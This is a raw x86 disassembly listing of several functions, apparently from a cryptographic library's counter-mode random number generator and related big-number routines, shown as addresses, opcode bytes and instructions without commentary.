  40625e:	50                   	push   %eax
  40625f:	8d 44 24 18          	lea    0x18(%esp),%eax
  406263:	50                   	push   %eax
  406264:	e8 bb e0 ff ff       	call   0x404324
  406269:	8b f0                	mov    %eax,%esi
  40626b:	85 f6                	test   %esi,%esi
  40626d:	0f 85 6e 01 00 00    	jne    0x4063e1
  406273:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  406277:	83 08 03             	orl    $0x3,(%eax)
  40627a:	33 db                	xor    %ebx,%ebx
  40627c:	ff 74 24 5c          	push   0x5c(%esp)
  406280:	8b 45 04             	mov    0x4(%ebp),%eax
  406283:	ff 74 24 5c          	push   0x5c(%esp)
  406287:	c1 e0 02             	shl    $0x2,%eax
  40628a:	50                   	push   %eax
  40628b:	8d 44 24 20          	lea    0x20(%esp),%eax
  40628f:	50                   	push   %eax
  406290:	e8 c8 f1 ff ff       	call   0x40545d
  406295:	8b f0                	mov    %eax,%esi
  406297:	85 f6                	test   %esi,%esi
  406299:	0f 85 42 01 00 00    	jne    0x4063e1
  40629f:	8d 44 24 14          	lea    0x14(%esp),%eax
  4062a3:	50                   	push   %eax
  4062a4:	e8 7d db ff ff       	call   0x403e26
  4062a9:	8b f0                	mov    %eax,%esi
  4062ab:	8d 44 24 20          	lea    0x20(%esp),%eax
  4062af:	50                   	push   %eax
  4062b0:	e8 71 db ff ff       	call   0x403e26
  4062b5:	3b f0                	cmp    %eax,%esi
  4062b7:	76 17                	jbe    0x4062d0
  4062b9:	2b f0                	sub    %eax,%esi
  4062bb:	8d 44 24 14          	lea    0x14(%esp),%eax
  4062bf:	56                   	push   %esi
  4062c0:	50                   	push   %eax
  4062c1:	e8 5e e0 ff ff       	call   0x404324
  4062c6:	8b f0                	mov    %eax,%esi
  4062c8:	85 f6                	test   %esi,%esi
  4062ca:	0f 85 11 01 00 00    	jne    0x4063e1
  4062d0:	8b c3                	mov    %ebx,%eax
  4062d2:	43                   	inc    %ebx
  4062d3:	83 f8 1e             	cmp    $0x1e,%eax
  4062d6:	0f 8f 48 01 00 00    	jg     0x406424
  4062dc:	8d 44 24 20          	lea    0x20(%esp),%eax
  4062e0:	50                   	push   %eax
  4062e1:	8d 44 24 18          	lea    0x18(%esp),%eax
  4062e5:	50                   	push   %eax
  4062e6:	e8 60 e1 ff ff       	call   0x40444b
  4062eb:	85 c0                	test   %eax,%eax
  4062ed:	79 8d                	jns    0x40627c
  4062ef:	6a 01                	push   $0x1
  4062f1:	8d 44 24 18          	lea    0x18(%esp),%eax
  4062f5:	50                   	push   %eax
  4062f6:	e8 e8 e1 ff ff       	call   0x4044e3
  4062fb:	85 c0                	test   %eax,%eax
  4062fd:	0f 8e 79 ff ff ff    	jle    0x40627c
  406303:	8d 44 24 44          	lea    0x44(%esp),%eax
  406307:	50                   	push   %eax
  406308:	55                   	push   %ebp
  406309:	8d 44 24 34          	lea    0x34(%esp),%eax
  40630d:	50                   	push   %eax
  40630e:	8d 44 24 20          	lea    0x20(%esp),%eax
  406312:	50                   	push   %eax
  406313:	50                   	push   %eax
  406314:	e8 99 eb ff ff       	call   0x404eb2
  406319:	8b f0                	mov    %eax,%esi
  40631b:	85 f6                	test   %esi,%esi
  40631d:	0f 85 be 00 00 00    	jne    0x4063e1
  406323:	8d 44 24 20          	lea    0x20(%esp),%eax
  406327:	50                   	push   %eax
  406328:	8d 44 24 18          	lea    0x18(%esp),%eax
  40632c:	50                   	push   %eax
  40632d:	e8 19 e1 ff ff       	call   0x40444b
  406332:	85 c0                	test   %eax,%eax
  406334:	0f 84 96 00 00 00    	je     0x4063d0
  40633a:	6a 01                	push   $0x1
  40633c:	8d 44 24 18          	lea    0x18(%esp),%eax
  406340:	50                   	push   %eax
  406341:	e8 9d e1 ff ff       	call   0x4044e3
  406346:	85 c0                	test   %eax,%eax
  406348:	0f 84 82 00 00 00    	je     0x4063d0
  40634e:	33 db                	xor    %ebx,%ebx
  406350:	43                   	inc    %ebx
  406351:	39 5c 24 54          	cmp    %ebx,0x54(%esp)
  406355:	76 56                	jbe    0x4063ad
  406357:	8d 44 24 20          	lea    0x20(%esp),%eax
  40635b:	50                   	push   %eax
  40635c:	8d 44 24 18          	lea    0x18(%esp),%eax
  406360:	50                   	push   %eax
  406361:	e8 e5 e0 ff ff       	call   0x40444b
  406366:	85 c0                	test   %eax,%eax
  406368:	74 43                	je     0x4063ad
  40636a:	8d 44 24 14          	lea    0x14(%esp),%eax
  40636e:	50                   	push   %eax
  40636f:	50                   	push   %eax
  406370:	8d 44 24 40          	lea    0x40(%esp),%eax
  406374:	50                   	push   %eax
  406375:	e8 45 e4 ff ff       	call   0x4047bf
  40637a:	8b f0                	mov    %eax,%esi
  40637c:	85 f6                	test   %esi,%esi
  40637e:	75 61                	jne    0x4063e1
  406380:	55                   	push   %ebp
  406381:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  406385:	50                   	push   %eax
  406386:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40638a:	50                   	push   %eax
  40638b:	e8 12 ea ff ff       	call   0x404da2
  406390:	8b f0                	mov    %eax,%esi
  406392:	85 f6                	test   %esi,%esi
  406394:	75 4b                	jne    0x4063e1
  406396:	6a 01                	push   $0x1
  406398:	8d 44 24 18          	lea    0x18(%esp),%eax
  40639c:	50                   	push   %eax
  40639d:	e8 41 e1 ff ff       	call   0x4044e3
  4063a2:	85 c0                	test   %eax,%eax
  4063a4:	74 07                	je     0x4063ad
  4063a6:	43                   	inc    %ebx
  4063a7:	3b 5c 24 54          	cmp    0x54(%esp),%ebx
  4063ab:	72 aa                	jb     0x406357
  4063ad:	8d 44 24 20          	lea    0x20(%esp),%eax
  4063b1:	50                   	push   %eax
  4063b2:	8d 44 24 18          	lea    0x18(%esp),%eax
  4063b6:	50                   	push   %eax
  4063b7:	e8 8f e0 ff ff       	call   0x40444b
  4063bc:	85 c0                	test   %eax,%eax
  4063be:	75 5f                	jne    0x40641f
  4063c0:	6a 01                	push   $0x1
  4063c2:	8d 44 24 18          	lea    0x18(%esp),%eax
  4063c6:	50                   	push   %eax
  4063c7:	e8 17 e1 ff ff       	call   0x4044e3
  4063cc:	85 c0                	test   %eax,%eax
  4063ce:	74 4f                	je     0x40641f
  4063d0:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4063d4:	43                   	inc    %ebx
  4063d5:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4063d9:	3b df                	cmp    %edi,%ebx
  4063db:	0f 82 2c fe ff ff    	jb     0x40620d
  4063e1:	8d 44 24 20          	lea    0x20(%esp),%eax
  4063e5:	50                   	push   %eax
  4063e6:	e8 d5 d5 ff ff       	call   0x4039c0
  4063eb:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4063ef:	50                   	push   %eax
  4063f0:	e8 cb d5 ff ff       	call   0x4039c0
  4063f5:	8d 44 24 38          	lea    0x38(%esp),%eax
  4063f9:	50                   	push   %eax
  4063fa:	e8 c1 d5 ff ff       	call   0x4039c0
  4063ff:	8d 44 24 14          	lea    0x14(%esp),%eax
  406403:	50                   	push   %eax
  406404:	e8 b7 d5 ff ff       	call   0x4039c0
  406409:	8d 44 24 44          	lea    0x44(%esp),%eax
  40640d:	50                   	push   %eax
  40640e:	e8 ad d5 ff ff       	call   0x4039c0
  406413:	8b c6                	mov    %esi,%eax
  406415:	5f                   	pop    %edi
  406416:	5e                   	pop    %esi
  406417:	5d                   	pop    %ebp
  406418:	5b                   	pop    %ebx
  406419:	83 c4 40             	add    $0x40,%esp
  40641c:	c2 0c 00             	ret    $0xc
  40641f:	6a f2                	push   $0xfffffff2
  406421:	5e                   	pop    %esi
  406422:	eb bd                	jmp    0x4063e1
  406424:	6a f2                	push   $0xfffffff2
  406426:	58                   	pop    %eax
  406427:	eb ec                	jmp    0x406415
  406429:	68 40 01 00 00       	push   $0x140
  40642e:	6a 00                	push   $0x0
  406430:	ff 74 24 0c          	push   0xc(%esp)
  406434:	e8 0e c2 ff ff       	call   0x402647
  406439:	83 c4 0c             	add    $0xc,%esp
  40643c:	c2 04 00             	ret    $0x4
  40643f:	55                   	push   %ebp
  406440:	8b ec                	mov    %esp,%ebp
  406442:	6a 20                	push   $0x20
  406444:	ff 75 18             	push   0x18(%ebp)
  406447:	ff 75 14             	push   0x14(%ebp)
  40644a:	ff 75 10             	push   0x10(%ebp)
  40644d:	ff 75 0c             	push   0xc(%ebp)
  406450:	ff 75 08             	push   0x8(%ebp)
  406453:	e8 3a 02 00 00       	call   0x406692
  406458:	5d                   	pop    %ebp
  406459:	c2 14 00             	ret    $0x14
  40645c:	56                   	push   %esi
  40645d:	8b 74 24 08          	mov    0x8(%esp),%esi
  406461:	85 f6                	test   %esi,%esi
  406463:	74 14                	je     0x406479
  406465:	8d 46 20             	lea    0x20(%esi),%eax
  406468:	50                   	push   %eax
  406469:	e8 31 c4 ff ff       	call   0x40289f
  40646e:	68 40 01 00 00       	push   $0x140
  406473:	56                   	push   %esi
  406474:	e8 7f 02 00 00       	call   0x4066f8
  406479:	5e                   	pop    %esi
  40647a:	c2 04 00             	ret    $0x4
  40647d:	8b 44 24 04          	mov    0x4(%esp),%eax
  406481:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  406485:	89 48 14             	mov    %ecx,0x14(%eax)
  406488:	c2 08 00             	ret    $0x8
  40648b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40648f:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  406493:	89 48 18             	mov    %ecx,0x18(%eax)
  406496:	c2 08 00             	ret    $0x8
  406499:	8b 44 24 04          	mov    0x4(%esp),%eax
  40649d:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4064a1:	89 48 1c             	mov    %ecx,0x1c(%eax)
  4064a4:	c2 08 00             	ret    $0x8
  4064a7:	55                   	push   %ebp
  4064a8:	8b ec                	mov    %esp,%ebp
  4064aa:	81 ec 80 01 00 00    	sub    $0x180,%esp
  4064b0:	b9 80 01 00 00       	mov    $0x180,%ecx
  4064b5:	56                   	push   %esi
  4064b6:	8b 75 08             	mov    0x8(%ebp),%esi
  4064b9:	57                   	push   %edi
  4064ba:	8b 7d 10             	mov    0x10(%ebp),%edi
  4064bd:	8b 46 18             	mov    0x18(%esi),%eax
  4064c0:	03 c7                	add    %edi,%eax
  4064c2:	3b c1                	cmp    %ecx,%eax
  4064c4:	76 05                	jbe    0x4064cb
  4064c6:	6a c8                	push   $0xffffffc8
  4064c8:	58                   	pop    %eax
  4064c9:	eb 7a                	jmp    0x406545
  4064cb:	51                   	push   %ecx
  4064cc:	8d 85 80 fe ff ff    	lea    -0x180(%ebp),%eax
  4064d2:	6a 00                	push   $0x0
  4064d4:	50                   	push   %eax
  4064d5:	e8 6d c1 ff ff       	call   0x402647
  4064da:	83 c4 0c             	add    $0xc,%esp
  4064dd:	8d 85 80 fe ff ff    	lea    -0x180(%ebp),%eax
  4064e3:	ff 76 18             	push   0x18(%esi)
  4064e6:	50                   	push   %eax
  4064e7:	ff b6 3c 01 00 00    	push   0x13c(%esi)
  4064ed:	ff 96 38 01 00 00    	call   *0x138(%esi)
  4064f3:	85 c0                	test   %eax,%eax
  4064f5:	74 04                	je     0x4064fb
  4064f7:	6a cc                	push   $0xffffffcc
  4064f9:	eb cd                	jmp    0x4064c8
  4064fb:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4064ff:	53                   	push   %ebx
  406500:	8b 5e 18             	mov    0x18(%esi),%ebx
  406503:	74 1b                	je     0x406520
  406505:	85 ff                	test   %edi,%edi
  406507:	74 17                	je     0x406520
  406509:	57                   	push   %edi
  40650a:	ff 75 0c             	push   0xc(%ebp)
  40650d:	8d 85 80 fe ff ff    	lea    -0x180(%ebp),%eax
  406513:	03 c3                	add    %ebx,%eax
  406515:	50                   	push   %eax
  406516:	e8 0a c1 ff ff       	call   0x402625
  40651b:	83 c4 0c             	add    $0xc,%esp
  40651e:	03 df                	add    %edi,%ebx
  406520:	53                   	push   %ebx
  406521:	8d 85 80 fe ff ff    	lea    -0x180(%ebp),%eax
  406527:	50                   	push   %eax
  406528:	50                   	push   %eax
  406529:	e8 e0 01 00 00       	call   0x40670e
  40652e:	8d 85 80 fe ff ff    	lea    -0x180(%ebp),%eax
  406534:	50                   	push   %eax
  406535:	56                   	push   %esi
  406536:	e8 73 03 00 00       	call   0x4068ae
  40653b:	c7 46 10 01 00 00 00 	movl   $0x1,0x10(%esi)
  406542:	33 c0                	xor    %eax,%eax
  406544:	5b                   	pop    %ebx
  406545:	5f                   	pop    %edi
  406546:	5e                   	pop    %esi
  406547:	8b e5                	mov    %ebp,%esp
  406549:	5d                   	pop    %ebp
  40654a:	c2 0c 00             	ret    $0xc
  40654d:	55                   	push   %ebp
  40654e:	8b ec                	mov    %esp,%ebp
  406550:	8b 45 10             	mov    0x10(%ebp),%eax
  406553:	83 ec 30             	sub    $0x30,%esp
  406556:	85 c0                	test   %eax,%eax
  406558:	74 24                	je     0x40657e
  40655a:	b9 80 01 00 00       	mov    $0x180,%ecx
  40655f:	3b c1                	cmp    %ecx,%eax
  406561:	76 02                	jbe    0x406565
  406563:	8b c1                	mov    %ecx,%eax
  406565:	50                   	push   %eax
  406566:	ff 75 0c             	push   0xc(%ebp)
  406569:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40656c:	50                   	push   %eax
  40656d:	e8 9c 01 00 00       	call   0x40670e
  406572:	8d 45 d0             	lea    -0x30(%ebp),%eax
  406575:	50                   	push   %eax
  406576:	ff 75 08             	push   0x8(%ebp)
  406579:	e8 30 03 00 00       	call   0x4068ae
  40657e:	8b e5                	mov    %ebp,%esp
  406580:	5d                   	pop    %ebp
  406581:	c2 0c 00             	ret    $0xc
  406584:	83 ec 40             	sub    $0x40,%esp
  406587:	53                   	push   %ebx
  406588:	8b 5c 24 50          	mov    0x50(%esp),%ebx
  40658c:	81 fb 00 04 00 00    	cmp    $0x400,%ebx
  406592:	76 08                	jbe    0x40659c
  406594:	6a ca                	push   $0xffffffca
  406596:	58                   	pop    %eax
  406597:	e9 d7 00 00 00       	jmp    0x406673
  40659c:	57                   	push   %edi
  40659d:	8b 7c 24 5c          	mov    0x5c(%esp),%edi
  4065a1:	81 ff 00 01 00 00    	cmp    $0x100,%edi
  4065a7:	76 08                	jbe    0x4065b1
  4065a9:	6a c8                	push   $0xffffffc8
  4065ab:	58                   	pop    %eax
  4065ac:	e9 c1 00 00 00       	jmp    0x406672
  4065b1:	56                   	push   %esi
  4065b2:	6a 30                	push   $0x30
  4065b4:	8d 44 24 20          	lea    0x20(%esp),%eax
  4065b8:	6a 00                	push   $0x0
  4065ba:	50                   	push   %eax
  4065bb:	e8 87 c0 ff ff       	call   0x402647
  4065c0:	8b 74 24 5c          	mov    0x5c(%esp),%esi
  4065c4:	83 c4 0c             	add    $0xc,%esp
  4065c7:	8b 46 10             	mov    0x10(%esi),%eax
  4065ca:	3b 46 1c             	cmp    0x1c(%esi),%eax
  4065cd:	7f 06                	jg     0x4065d5
  4065cf:	83 7e 14 00          	cmpl   $0x0,0x14(%esi)
  4065d3:	74 15                	je     0x4065ea
  4065d5:	57                   	push   %edi
  4065d6:	ff 74 24 60          	push   0x60(%esp)
  4065da:	56                   	push   %esi
  4065db:	e8 c7 fe ff ff       	call   0x4064a7
  4065e0:	85 c0                	test   %eax,%eax
  4065e2:	0f 85 89 00 00 00    	jne    0x406671
  4065e8:	33 ff                	xor    %edi,%edi
  4065ea:	85 ff                	test   %edi,%edi
  4065ec:	74 1a                	je     0x406608
  4065ee:	57                   	push   %edi
  4065ef:	ff 74 24 60          	push   0x60(%esp)
  4065f3:	8d 44 24 24          	lea    0x24(%esp),%eax
  4065f7:	50                   	push   %eax
  4065f8:	e8 11 01 00 00       	call   0x40670e
  4065fd:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  406601:	50                   	push   %eax
  406602:	56                   	push   %esi
  406603:	e8 a6 02 00 00       	call   0x4068ae
  406608:	85 db                	test   %ebx,%ebx
  40660a:	74 55                	je     0x406661
  40660c:	55                   	push   %ebp
  40660d:	33 ed                	xor    %ebp,%ebp
  40660f:	8d 46 0f             	lea    0xf(%esi),%eax
  406612:	45                   	inc    %ebp
  406613:	8d 56 20             	lea    0x20(%esi),%edx
  406616:	2b ee                	sub    %esi,%ebp
  406618:	8b c8                	mov    %eax,%ecx
  40661a:	fe 01                	incb   (%ecx)
  40661c:	75 08                	jne    0x406626
  40661e:	49                   	dec    %ecx
  40661f:	8d 04 29             	lea    (%ecx,%ebp,1),%eax
  406622:	85 c0                	test   %eax,%eax
  406624:	7f f4                	jg     0x40661a
  406626:	8d 44 24 10          	lea    0x10(%esp),%eax
  40662a:	50                   	push   %eax
  40662b:	56                   	push   %esi
  40662c:	6a 01                	push   $0x1
  40662e:	52                   	push   %edx
  40662f:	e8 fb c5 ff ff       	call   0x402c2f
  406634:	83 fb 10             	cmp    $0x10,%ebx
  406637:	76 05                	jbe    0x40663e
  406639:	6a 10                	push   $0x10
  40663b:	5f                   	pop    %edi
  40663c:	eb 02                	jmp    0x406640
  40663e:	8b fb                	mov    %ebx,%edi
  406640:	57                   	push   %edi
  406641:	8d 44 24 14          	lea    0x14(%esp),%eax
  406645:	50                   	push   %eax
  406646:	ff 74 24 60          	push   0x60(%esp)
  40664a:	e8 d6 bf ff ff       	call   0x402625
  40664f:	01 7c 24 64          	add    %edi,0x64(%esp)
  406653:	8d 46 0f             	lea    0xf(%esi),%eax
  406656:	83 c4 0c             	add    $0xc,%esp
  406659:	8d 56 20             	lea    0x20(%esi),%edx
  40665c:	2b df                	sub    %edi,%ebx
  40665e:	75 b8                	jne    0x406618
  406660:	5d                   	pop    %ebp
  406661:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  406665:	50                   	push   %eax
  406666:	56                   	push   %esi
  406667:	e8 42 02 00 00       	call   0x4068ae
  40666c:	ff 46 10             	incl   0x10(%esi)
  40666f:	33 c0                	xor    %eax,%eax
  406671:	5e                   	pop    %esi
  406672:	5f                   	pop    %edi
  406673:	5b                   	pop    %ebx
  406674:	83 c4 40             	add    $0x40,%esp
  406677:	c2 14 00             	ret    $0x14
  40667a:	6a 00                	push   $0x0
  40667c:	6a 00                	push   $0x0
  40667e:	ff 74 24 14          	push   0x14(%esp)
  406682:	ff 74 24 14          	push   0x14(%esp)
  406686:	ff 74 24 14          	push   0x14(%esp)
  40668a:	e8 f5 fe ff ff       	call   0x406584
  40668f:	c2 0c 00             	ret    $0xc
  406692:	55                   	push   %ebp
  406693:	8b ec                	mov    %esp,%ebp
  406695:	83 ec 20             	sub    $0x20,%esp
  406698:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40669b:	56                   	push   %esi
  40669c:	57                   	push   %edi
  40669d:	6a 20                	push   $0x20
  40669f:	6a 00                	push   $0x0
  4066a1:	50                   	push   %eax
  4066a2:	e8 a0 bf ff ff       	call   0x402647
  4066a7:	8b 7d 08             	mov    0x8(%ebp),%edi
  4066aa:	83 c4 0c             	add    $0xc,%esp
  4066ad:	8d 77 20             	lea    0x20(%edi),%esi
  4066b0:	56                   	push   %esi
  4066b1:	e8 d3 c1 ff ff       	call   0x402889
  4066b6:	8b 45 0c             	mov    0xc(%ebp),%eax
  4066b9:	89 87 38 01 00 00    	mov    %eax,0x138(%edi)
  4066bf:	8b 45 10             	mov    0x10(%ebp),%eax
  4066c2:	89 87 3c 01 00 00    	mov    %eax,0x13c(%edi)
  4066c8:	8b 45 1c             	mov    0x1c(%ebp),%eax
  4066cb:	89 47 18             	mov    %eax,0x18(%edi)
  4066ce:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4066d1:	68 00 01 00 00       	push   $0x100
  4066d6:	50                   	push   %eax
  4066d7:	56                   	push   %esi
  4066d8:	c7 47 1c 10 27 00 00 	movl   $0x2710,0x1c(%edi)
  4066df:	e8 d3 c1 ff ff       	call   0x4028b7
  4066e4:	ff 75 18             	push   0x18(%ebp)
  4066e7:	ff 75 14             	push   0x14(%ebp)
  4066ea:	57                   	push   %edi
  4066eb:	e8 b7 fd ff ff       	call   0x4064a7
  4066f0:	5f                   	pop    %edi
  4066f1:	5e                   	pop    %esi
  4066f2:	8b e5                	mov    %ebp,%esp
  4066f4:	5d                   	pop    %ebp
  4066f5:	c2 18 00             	ret    $0x18
  4066f8:	8b 44 24 08          	mov    0x8(%esp),%eax
  4066fc:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  406700:	85 c0                	test   %eax,%eax
  406702:	74 07                	je     0x40670b
  406704:	c6 01 00             	movb   $0x0,(%ecx)
  406707:	41                   	inc    %ecx
  406708:	48                   	dec    %eax
  406709:	75 f9                	jne    0x406704
  40670b:	c2 08 00             	ret    $0x8
  40670e:	81 ec 18 03 00 00    	sub    $0x318,%esp
  406714:	53                   	push   %ebx
  406715:	8b 9c 24 28 03 00 00 	mov    0x328(%esp),%ebx
  40671c:	81 fb 80 01 00 00    	cmp    $0x180,%ebx
  406722:	76 08                	jbe    0x40672c
  406724:	6a c8                	push   $0xffffffc8
  406726:	58                   	pop    %eax
  406727:	e9 78 01 00 00       	jmp    0x4068a4
  40672c:	55                   	push   %ebp
  40672d:	56                   	push   %esi
  40672e:	57                   	push   %edi
  40672f:	68 a0 01 00 00       	push   $0x1a0
  406734:	8d 44 24 74          	lea    0x74(%esp),%eax
  406738:	6a 00                	push   $0x0
  40673a:	50                   	push   %eax
  40673b:	e8 07 bf ff ff       	call   0x402647
  406740:	83 c4 0c             	add    $0xc,%esp
  406743:	8d 84 24 10 02 00 00 	lea    0x210(%esp),%eax
  40674a:	50                   	push   %eax
  40674b:	e8 39 c1 ff ff       	call   0x402889
  406750:	8b c3                	mov    %ebx,%eax
  406752:	88 9c 24 83 00 00 00 	mov    %bl,0x83(%esp)
  406759:	c1 e8 18             	shr    $0x18,%eax
  40675c:	88 84 24 80 00 00 00 	mov    %al,0x80(%esp)
  406763:	8b c3                	mov    %ebx,%eax
  406765:	c1 e8 10             	shr    $0x10,%eax
  406768:	88 84 24 81 00 00 00 	mov    %al,0x81(%esp)
  40676f:	8b c3                	mov    %ebx,%eax
  406771:	c1 e8 08             	shr    $0x8,%eax
  406774:	53                   	push   %ebx
  406775:	ff b4 24 34 03 00 00 	push   0x334(%esp)
  40677c:	88 84 24 8a 00 00 00 	mov    %al,0x8a(%esp)
  406783:	8d 84 24 90 00 00 00 	lea    0x90(%esp),%eax
  40678a:	50                   	push   %eax
  40678b:	c6 84 24 93 00 00 00 	movb   $0x30,0x93(%esp)
  406792:	30 
  406793:	e8 8d be ff ff       	call   0x402625
  406798:	83 c4 0c             	add    $0xc,%esp
  40679b:	c6 84 1c 88 00 00 00 	movb   $0x80,0x88(%esp,%ebx,1)
  4067a2:	80 
  4067a3:	8d 6b 19             	lea    0x19(%ebx),%ebp
  4067a6:	33 c0                	xor    %eax,%eax
  4067a8:	88 44 04 50          	mov    %al,0x50(%esp,%eax,1)
  4067ac:	40                   	inc    %eax
  4067ad:	83 f8 20             	cmp    $0x20,%eax
  4067b0:	7c f6                	jl     0x4067a8
  4067b2:	68 00 01 00 00       	push   $0x100
  4067b7:	8d 44 24 54          	lea    0x54(%esp),%eax
  4067bb:	50                   	push   %eax
  4067bc:	8d 84 24 18 02 00 00 	lea    0x218(%esp),%eax
  4067c3:	50                   	push   %eax
  4067c4:	e8 ee c0 ff ff       	call   0x4028b7
  4067c9:	33 db                	xor    %ebx,%ebx
  4067cb:	6a 10                	push   $0x10
  4067cd:	8d 44 24 14          	lea    0x14(%esp),%eax
  4067d1:	6a 00                	push   $0x0
  4067d3:	50                   	push   %eax
  4067d4:	e8 6e be ff ff       	call   0x402647
  4067d9:	83 c4 0c             	add    $0xc,%esp
  4067dc:	8b fd                	mov    %ebp,%edi
  4067de:	85 ed                	test   %ebp,%ebp
  4067e0:	74 42                	je     0x406824
  4067e2:	8d 74 24 70          	lea    0x70(%esp),%esi
  4067e6:	8d 44 24 10          	lea    0x10(%esp),%eax
  4067ea:	2b f0                	sub    %eax,%esi
  4067ec:	33 d2                	xor    %edx,%edx
  4067ee:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4067f2:	03 ca                	add    %edx,%ecx
  4067f4:	6a 10                	push   $0x10
  4067f6:	8a 04 0e             	mov    (%esi,%ecx,1),%al
  4067f9:	30 01                	xor    %al,(%ecx)
  4067fb:	42                   	inc    %edx
  4067fc:	58                   	pop    %eax
  4067fd:	3b d0                	cmp    %eax,%edx
  4067ff:	7c ed                	jl     0x4067ee
  406801:	03 f0                	add    %eax,%esi
  406803:	3b f8                	cmp    %eax,%edi
  406805:	73 02                	jae    0x406809
  406807:	8b c7                	mov    %edi,%eax
  406809:	2b f8                	sub    %eax,%edi
  40680b:	8d 44 24 10          	lea    0x10(%esp),%eax
  40680f:	50                   	push   %eax
  406810:	50                   	push   %eax
  406811:	6a 01                	push   $0x1
  406813:	8d 84 24 1c 02 00 00 	lea    0x21c(%esp),%eax
  40681a:	50                   	push   %eax
  40681b:	e8 0f c4 ff ff       	call   0x402c2f
  406820:	85 ff                	test   %edi,%edi
  406822:	75 c8                	jne    0x4067ec
  406824:	6a 10                	push   $0x10
  406826:	8d 44 24 14          	lea    0x14(%esp),%eax
  40682a:	50                   	push   %eax
  40682b:	8d 44 24 28          	lea    0x28(%esp),%eax
  40682f:	03 c3                	add    %ebx,%eax
  406831:	50                   	push   %eax
  406832:	e8 ee bd ff ff       	call   0x402625
  406837:	83 c4 0c             	add    $0xc,%esp
  40683a:	83 c3 10             	add    $0x10,%ebx
  40683d:	fe 44 24 73          	incb   0x73(%esp)
  406841:	83 fb 30             	cmp    $0x30,%ebx
  406844:	7c 85                	jl     0x4067cb
  406846:	68 00 01 00 00       	push   $0x100
  40684b:	8d 44 24 24          	lea    0x24(%esp),%eax
  40684f:	50                   	push   %eax
  406850:	8d 84 24 18 02 00 00 	lea    0x218(%esp),%eax
  406857:	50                   	push   %eax
  406858:	e8 5a c0 ff ff       	call   0x4028b7
  40685d:	8b b4 24 2c 03 00 00 	mov    0x32c(%esp),%esi
  406864:	6a 03                	push   $0x3
  406866:	5f                   	pop    %edi
  406867:	8d 44 24 40          	lea    0x40(%esp),%eax
  40686b:	50                   	push   %eax
  40686c:	50                   	push   %eax
  40686d:	6a 01                	push   $0x1
  40686f:	8d 84 24 1c 02 00 00 	lea    0x21c(%esp),%eax
  406876:	50                   	push   %eax
  406877:	e8 b3 c3 ff ff       	call   0x402c2f
  40687c:	6a 10                	push   $0x10
  40687e:	8d 44 24 44          	lea    0x44(%esp),%eax
  406882:	50                   	push   %eax
  406883:	56                   	push   %esi
  406884:	e8 9c bd ff ff       	call   0x402625
  406889:	83 c4 0c             	add    $0xc,%esp
  40688c:	83 c6 10             	add    $0x10,%esi
  40688f:	4f                   	dec    %edi
  406890:	75 d5                	jne    0x406867
  406892:	8d 84 24 10 02 00 00 	lea    0x210(%esp),%eax
  406899:	50                   	push   %eax
  40689a:	e8 00 c0 ff ff       	call   0x40289f
  40689f:	5f                   	pop    %edi
  4068a0:	5e                   	pop    %esi
  4068a1:	33 c0                	xor    %eax,%eax
  4068a3:	5d                   	pop    %ebp
  4068a4:	5b                   	pop    %ebx
  4068a5:	81 c4 18 03 00 00    	add    $0x318,%esp
  4068ab:	c2 0c 00             	ret    $0xc
  4068ae:	83 ec 34             	sub    $0x34,%esp
  4068b1:	53                   	push   %ebx
  4068b2:	55                   	push   %ebp
  4068b3:	56                   	push   %esi
  4068b4:	57                   	push   %edi
  4068b5:	6a 30                	push   $0x30
  4068b7:	33 f6                	xor    %esi,%esi
  4068b9:	8d 5c 24 18          	lea    0x18(%esp),%ebx
  4068bd:	8b c3                	mov    %ebx,%eax
  4068bf:	89 74 24 14          	mov    %esi,0x14(%esp)
  4068c3:	56                   	push   %esi
  4068c4:	50                   	push   %eax
  4068c5:	e8 7d bd ff ff       	call   0x402647
  4068ca:	8b 7c 24 54          	mov    0x54(%esp),%edi
  4068ce:	33 ed                	xor    %ebp,%ebp
  4068d0:	45                   	inc    %ebp
  4068d1:	c7 44 24 54 03 00 00 	movl   $0x3,0x54(%esp)
  4068d8:	00 
  4068d9:	83 c4 0c             	add    $0xc,%esp
  4068dc:	2b ef                	sub    %edi,%ebp
  4068de:	8d 47 0f             	lea    0xf(%edi),%eax
  4068e1:	8d 77 20             	lea    0x20(%edi),%esi
  4068e4:	8b c8                	mov    %eax,%ecx
  4068e6:	fe 01                	incb   (%ecx)
  4068e8:	75 08                	jne    0x4068f2
  4068ea:	49                   	dec    %ecx
  4068eb:	8d 04 29             	lea    (%ecx,%ebp,1),%eax
  4068ee:	85 c0                	test   %eax,%eax
  4068f0:	7f f4                	jg     0x4068e6
  4068f2:	53                   	push   %ebx
  4068f3:	57                   	push   %edi
  4068f4:	6a 01                	push   $0x1
  4068f6:	56                   	push   %esi
  4068f7:	e8 33 c3 ff ff       	call   0x402c2f
  4068fc:	83 c3 10             	add    $0x10,%ebx
  4068ff:	8d 47 0f             	lea    0xf(%edi),%eax
  406902:	ff 4c 24 48          	decl   0x48(%esp)
  406906:	75 dc                	jne    0x4068e4
  406908:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  40690c:	8d 44 24 14          	lea    0x14(%esp),%eax
  406910:	8b 74 24 10          	mov    0x10(%esp),%esi
  406914:	2b d0                	sub    %eax,%edx
  406916:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  40691a:	03 ce                	add    %esi,%ecx
  40691c:	8a 04 0a             	mov    (%edx,%ecx,1),%al
  40691f:	30 01                	xor    %al,(%ecx)
  406921:	46                   	inc    %esi
  406922:	83 fe 30             	cmp    $0x30,%esi
  406925:	7c ef                	jl     0x406916
  406927:	68 00 01 00 00       	push   $0x100
